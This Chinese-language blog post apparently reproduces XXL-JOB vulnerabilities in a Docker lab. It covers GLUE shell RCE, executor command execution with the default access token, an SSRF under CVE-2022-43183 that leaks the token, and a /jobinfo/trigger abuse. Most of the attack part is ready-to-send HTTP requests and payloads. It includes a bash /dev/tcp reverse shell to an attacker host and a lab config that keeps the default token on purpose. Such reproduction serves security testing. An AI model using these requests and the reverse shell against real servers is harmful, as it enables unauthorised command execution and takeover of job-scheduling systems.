    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 安装 Docker</span><br>curl -fsSL https://get.docker.com | bash -s docker --mirror Aliyun<br><br><span class="hljs-comment"># 启动并设置开机自启</span><br>systemctl start docker<br>systemctl <span class="hljs-built_in">enable</span> docker<br><br><span class="hljs-comment"># 安装 docker-compose（V1 版本，兼容性好）</span><br>curl -L <span class="hljs-string">&quot;https://github.com/docker/compose/releases/download/1.29.2/docker-compose-<span class="hljs-subst">$(uname -s)</span>-<span class="hljs-subst">$(uname -m)</span>&quot;</span> -o /usr/local/bin/docker-compose<br><span class="hljs-built_in">chmod</span> +x /usr/local/bin/docker-compose<br><br><span class="hljs-comment"># 验证</span><br>docker -v<br>docker-compose -v<br></code></pre></td></tr></table></figure><p>加速器</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /etc/docker<br><br><span class="hljs-built_in">cat</span> &gt; /etc/docker/daemon.json &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span><br>&#123;<br>  <span class="hljs-string">&quot;registry-mirrors&quot;</span>: [<br>    <span class="hljs-string">&quot;https://docker.xuanyuan.me&quot;</span>,<br>    <span class="hljs-string">&quot;https://docker.1ms.run&quot;</span>,<br>    <span class="hljs-string">&quot;https://docker.mszx.com&quot;</span><br>  ]<br>&#125;<br>EOF<br><br>systemctl daemon-reload<br>systemctl restart docker<br><br><span class="hljs-comment"># 验证镜像源已生效</span><br>docker info | grep -A 4 <span class="hljs-string">&quot;Registry Mirrors&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p /root/xxl-job-quickstart<br><span class="hljs-built_in">cd</span> /root/xxl-job-quickstart<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -L -o tables_xxl_job.sql https://gitee.com/xuxueli0323/xxl-job/raw/2.3.1/doc/db/tables_xxl_job.sql<br><span class="hljs-comment">#curl -L -o tables_xxl_job.sql https://raw.githubusercontent.com/xuxueli/xxl-job/2.3.1/doc/db/tables_xxl_job.sql</span><br><span class="hljs-comment"># 验证：文件应约 6.7K，开头是 # XXL-JOB v2.3.1</span><br><span class="hljs-built_in">ls</span> -lh tables_xxl_job.sql<br><span class="hljs-built_in">head</span> -3 tables_xxl_job.sql<br></code></pre></td></tr></table></figure><p>docker-compose.yml</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">cat &gt; docker-compose.yml &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span><br>version: <span class="hljs-string">&#x27;3.8&#x27;</span><br><br>services:<br>  mysql:<br>    image: mysql:<span class="hljs-number">5.7</span>.<span class="hljs-number">35</span><br>    container_name: xxl-job-mysql<br>    restart: always<br>    environment:<br>      MYSQL_ROOT_PASSWORD: root_pwd<br>      MYSQL_DATABASE: xxl_job<br>      TZ: Asia/Shanghai<br>    ports:<br>      - <span class="hljs-string">&quot;3306:3306&quot;</span><br>    volumes:<br>      - mysql-data:/var/lib/mysql<br>      - ./tables_xxl_job.sql:/docker-<span class="hljs-keyword">entrypoint</span><span class="language-bash">-initdb.d/tables_xxl_job.sql:ro</span><br>    command: --character-set-server=utf8mb4 --collation-server=utf8mb4_unicode_ci<br>    <span class="hljs-keyword">healthcheck</span><span class="language-bash">:</span><br>      test: [<span class="hljs-string">&quot;CMD&quot;</span>, <span class="hljs-string">&quot;mysqladmin&quot;</span>, <span class="hljs-string">&quot;ping&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>, <span class="hljs-string">&quot;localhost&quot;</span>, <span class="hljs-string">&quot;-uroot&quot;</span>, <span class="hljs-string">&quot;-proot_pwd&quot;</span>]<br>      timeout: <span class="hljs-number">20</span>s<br>      retries: <span class="hljs-number">10</span><br>    networks:<br>      - xxl-job-network<br><br>  xxl-job-admin:<br>    image: xuxueli/xxl-job-admin:<span class="hljs-number">2.3</span>.<span class="hljs-number">1</span><br>    container_name: xxl-job-admin<br>    restart: always<br>    depends_on:<br>      mysql:<br>        condition: service_healthy<br>    ports:<br>      - <span class="hljs-string">&quot;8080:8080&quot;</span><br>    environment:<br>      PARAMS: &gt;-<br>        --spring.datasource.url=jdbc:mysql://mysql:<span class="hljs-number">3306</span>/xxl_job?useUnicode=true&amp;characterEncoding=UTF-<span class="hljs-number">8</span>&amp;autoReconnect=true&amp;serverTimezone=Asia/Shanghai<br>        --spring.datasource.username=root<br>        --spring.datasource.password=root_pwd<br>        --xxl.job.accessToken=default_token<br>    volumes:<br>      - ./xxl-job-logs:/data/applogs<br>    networks:<br>      - xxl-job-network<br><br>  xxl-job-executor:<br>    image: chinayin/xxl-job-executor-springboot:<span class="hljs-number">2.3</span>.<span class="hljs-number">1</span><br>    container_name: xxl-job-executor<br>    restart: always<br>    depends_on:<br>      - xxl-job-admin<br>    ports:<br>      - <span class="hljs-string">&quot;9999:9999&quot;</span><br>    volumes:<br>      - ./executor.properties:/app/application.properties:ro<br>      - ./xxl-job-executor-logs:/data/applogs<br>    networks:<br>      - xxl-job-network<br><br>volumes:<br>  mysql-data:<br><br>networks:<br>  xxl-job-network:<br>    driver: bridge<br>EOF<br></code></pre></td></tr></table></figure><p>配置文件</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs routeros">cat &gt; executor.properties &lt;&lt; <span class="hljs-string">&#x27;EOF&#x27;</span><br><span class="hljs-comment"># 调度中心地址（使用 Docker 服务名）</span><br>xxl.job.admin.<span class="hljs-attribute">addresses</span>=http://xxl-job-admin:8080/xxl-job-admin<br><br><span class="hljs-comment"># 关键：保持默认 Token，这是漏洞复现的前提</span><br>xxl.job.<span class="hljs-attribute">accessToken</span>=default_token<br><br><span class="hljs-comment"># 执行器配置</span><br>xxl.job.executor.<span class="hljs-attribute">appname</span>=xxl-job-executor-sample<br>xxl.job.executor.ip=<br>xxl.job.executor.<span class="hljs-attribute">port</span>=9999<br>xxl.job.executor.<span class="hljs-attribute">logpath</span>=/data/applogs/xxl-job/jobhandler<br>xxl.job.executor.<span class="hljs-attribute">logretentiondays</span>=30<br><br><span class="hljs-comment"># Web 端口改为 8081，避免与 Netty 的 9999 冲突</span><br>server.<span class="hljs-attribute">port</span>=8081<br>EOF<br></code></pre></td></tr></table></figure><p>启动</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-comment"># 首次启动</span><br>docker<span class="hljs-literal">-compose</span> up <span class="hljs-literal">-d</span><br><br><span class="hljs-comment"># 查看容器状态</span><br>docker<span class="hljs-literal">-compose</span> <span class="hljs-built_in">ps</span><br></code></pre></td></tr></table></figure><p>日志</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">docker-compose logs -f mysql</span><br></code></pre></td></tr></table></figure><hr><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><table><thead><tr><th align="center">场景</th><th align="center">方法</th></tr></thead><tbody><tr><td align="center">无法登录后台</td><td align="center">默认token</td></tr><tr><td align="center">能登录后台</td><td align="center">GLUE RCE</td></tr></tbody></table><hr><h3 id="一、GLUE-RCE（2020）"><a href="#一、GLUE-RCE（2020）" class="headerlink" title="一、GLUE RCE（2020）"></a>一、GLUE RCE（2020）</h3><p>登录后台</p><p>任务管理 新增 运行模式修改为GLUE(Shell) cron填0 0 0 * * ?（随便，反正手动触发），其他任意</p><p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010091341160-1046725985.png" alt="image-20261010091338235"></p><p>GLUE IDE编辑</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>bash -i &gt;&amp; /dev/tcp/10.10.10.128/8888 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>保存 执行一次</p><p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010091426273-1244433247.png" alt="image-20261010091425811"></p><h3 id="二、默认token（2022）"><a href="#二、默认token（2022）" class="headerlink" title="二、默认token（2022）"></a>二、默认token（2022）</h3><p>Host地址为执行器地址</p><p>1、验证默认token</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/beat</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.130:9999<br><span class="hljs-attribute">XXL-JOB-ACCESS-TOKEN</span><span class="hljs-punctuation">: </span>default_token<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>2<br><br><span class="language-dust"><span class="hljs-template-variable">&#123;&#125;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010152342782-51158153.png" alt="image-20261010152341924"></p><p>2、执行shell</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/run</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.130:9999<br><span class="hljs-attribute">XXL-JOB-ACCESS-TOKEN</span><span class="hljs-punctuation">: </span>default_token<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json;charset=UTF-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>316<br><br><span class="language-dns">&#123;<span class="hljs-string">&quot;jobId&quot;</span>:<span class="hljs-number">666666</span>,<span class="hljs-string">&quot;executorHandler&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;executorParams&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;executorBlockStrategy&quot;</span>:<span class="hljs-string">&quot;SERIAL_EXECUTION&quot;</span>,<span class="hljs-string">&quot;executorTimeout&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;logId&quot;</span>:<span class="hljs-number">424242</span>,<span class="hljs-string">&quot;logDateTime&quot;</span>:<span class="hljs-number">1791616810000</span>,<span class="hljs-string">&quot;glueType&quot;</span>:<span class="hljs-string">&quot;GLUE_SHELL&quot;</span>,<span class="hljs-string">&quot;glueSource&quot;</span>:<span class="hljs-string">&quot;#!/bin/bash<span class="hljs-char escape_">\n</span>id;whoami;hostname;uname -a<span class="hljs-char escape_">\n</span>&quot;</span>,<span class="hljs-string">&quot;glueUpdatetime&quot;</span>:<span class="hljs-number">1791616810000</span>,<span class="hljs-string">&quot;broadcastIndex&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;broadcastTotal&quot;</span>:<span class="hljs-number">1</span>&#125;</span><br></code></pre></td></tr></table></figure><p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010152408784-1246611472.png" alt="image-20261010152408242"></p><p>3、读取回显</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/log</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.130:9999<br><span class="hljs-attribute">XXL-JOB-ACCESS-TOKEN</span><span class="hljs-punctuation">: </span>default_token<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json;charset=UTF-8<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>46<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;logDateTim&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1791616810000</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;logId&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">424242</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;fromLineNum&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure><p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010152502246-68005640.png" alt="image-20261010152501368"></p><h3 id="三、CVE-2022-43183"><a href="#三、CVE-2022-43183" class="headerlink" title="三、CVE-2022-43183"></a>三、CVE-2022-43183</h3><p>1、登录会话-&gt;获取token</p><p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010153226323-453988186.png" alt="image-20261010153225785"></p><p>2、攻击机起nc监听</p><p>3、发ssrf请求</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /xxl-job-admin/joblog/logDetailCat?executorAddress=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F<span class="hljs-number">10.10.10.128</span>%<span class="hljs-number">3</span>A4545%<span class="hljs-number">2</span>F&amp;triggerTime=<span class="hljs-number">0</span>&amp;logId=<span class="hljs-number">1</span>&amp;fromLineNum=<span class="hljs-number">1</span> HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">10.10.10.130:8080</span><br><span class="hljs-attribute">Cookie</span>: XXL_JOB_LOGIN_IDENTITY=<span class="hljs-number">7</span>b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d; Path=/; HttpOnly<br><span class="hljs-attribute">Connection</span>: close<br></code></pre></td></tr></table></figure><p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010153550774-1747018953.png" alt="image-20261010153550126"></p><p>4、响应数据</p><p><img src="https://img2024.cnblogs.com/blog/3373819/202610/3373819-20261010153749198-1346525655.png" alt="image-20261010153748320"></p><p>5、拿到XXL-JOB-ACCESS-TOKEN可以使用<code>二、</code>使用调度中心执行命令</p><h3 id="四、-jobinfo-trigger（2026）"><a href="#四、-jobinfo-trigger（2026）" class="headerlink" title="四、&#x2F;jobinfo&#x2F;trigger（2026）"></a>四、&#x2F;jobinfo&#x2F;trigger（2026）</h3><p>1、登录会话-&gt;获取token</p><p>2、攻击机起nc监听</p><p>3、新建GLUE(Shell) </p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxl-job-admin/jobinfo/add</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.130:8080<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d; Path=/; HttpOnly<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>320<br><br><span class="language-freedesktop"><span class="hljs-attr">jobGroup</span><span class="hljs-operator">=</span>1&amp;jobDesc<span class="hljs-operator">=</span>poc_jobinfo&amp;author<span class="hljs-operator">=</span>pentest&amp;alarmEmail<span class="hljs-operator">=</span>&amp;scheduleType<span class="hljs-operator">=</span>CRON&amp;scheduleConf<span class="hljs-operator">=</span>0+0+0+*+*+%3F&amp;glueType<span class="hljs-operator">=</span>GLUE_SHELL&amp;executorHandler<span class="hljs-operator">=</span>&amp;executorParam<span class="hljs-operator">=</span>&amp;executorRouteStrategy<span class="hljs-operator">=</span>FIRST&amp;childJobId<span class="hljs-operator">=</span>&amp;misfireStrategy<span class="hljs-operator">=</span>DO_NOTHING&amp;executorBlockStrategy<span class="hljs-operator">=</span>SERIAL_EXECUTION&amp;executorTimeout<span class="hljs-operator">=</span>0&amp;executorFailRetryCount<span class="hljs-operator">=</span>0&amp;glueRemark<span class="hljs-operator">=</span>pentest+poc&amp;glueSource<span class="hljs-operator">=</span></span><br></code></pre></td></tr></table></figure><p>4、写入GLUE</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxl-job-admin/jobcode/save</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.130:8080<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d; Path=/; HttpOnly<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>84<br><br><span class="language-apache"><span class="hljs-attribute">id</span>=<span class="hljs-number">4</span>&amp;glueSource=%<span class="hljs-number">23</span>%<span class="hljs-number">21</span>%<span class="hljs-number">2</span>Fbin%<span class="hljs-number">2</span>Fbash%<span class="hljs-number">0</span>Aid%<span class="hljs-number">0</span>A&amp;glueRemark=pentest+poc</span><br></code></pre></td></tr></table></figure><p>5、带任意addressList触发</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/xxl-job-admin/jobinfo/trigger</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.130:8080<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>XXL_JOB_LOGIN_IDENTITY=7b226964223a312c22757365726e616d65223a2261646d696e222c2270617373776f7264223a226531306164633339343962613539616262653536653035376632306638383365222c22726f6c65223a312c227065726d697373696f6e223a6e756c6c7d; Path=/; HttpOnly<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>78<br><br><span class="language-freedesktop"><span class="hljs-attr">id</span><span class="hljs-operator">=</span>4&amp;executorParam<span class="hljs-operator">=</span>&amp;addressList<span class="hljs-operator">=</span>http://10.10.10.128:4545/</span><br></code></pre></td></tr></table></figure><p>6、攻击机</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/run</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>10.10.10.128:4545<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json;charset=UTF-8<br><span class="hljs-attribute">Accept-Charset</span><span class="hljs-punctuation">: </span>application/json;charset=UTF-8<br><span class="hljs-attribute">XXL-JOB-ACCESS-TOKEN</span><span class="hljs-punctuation">: </span>default_token<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">Pragma</span><span class="hljs-punctuation">: </span>no-cache<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Java/1.8.0_332<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>279<br><br><span class="language-dns">&#123;<span class="hljs-string">&quot;jobId&quot;</span>:<span class="hljs-number">4</span>,<span class="hljs-string">&quot;executorHandler&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;executorParams&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;executorBlockStrategy&quot;</span>:<span class="hljs-string">&quot;SERIAL_EXECUTION&quot;</span>,<span class="hljs-string">&quot;executorTimeout&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;logId&quot;</span>:<span class="hljs-number">2</span>,<span class="hljs-string">&quot;logDateTime&quot;</span>:<span class="hljs-number">1791618132326</span>,<span class="hljs-string">&quot;glueType&quot;</span>:<span class="hljs-string">&quot;GLUE_SHELL&quot;</span>,<span class="hljs-string">&quot;glueSource&quot;</span>:<span class="hljs-string">&quot;#!/bin/bash<span class="hljs-char escape_">\n</span>id<span class="hljs-char escape_">\n</span>&quot;</span>,<span class="hljs-string">&quot;glueUpdatetime&quot;</span>:<span class="hljs-number">1791618132000</span>,<span class="hljs-string">&quot;broadcastIndex&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;broadcastTotal&quot;</span>:<span class="hljs-number">1</span>&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
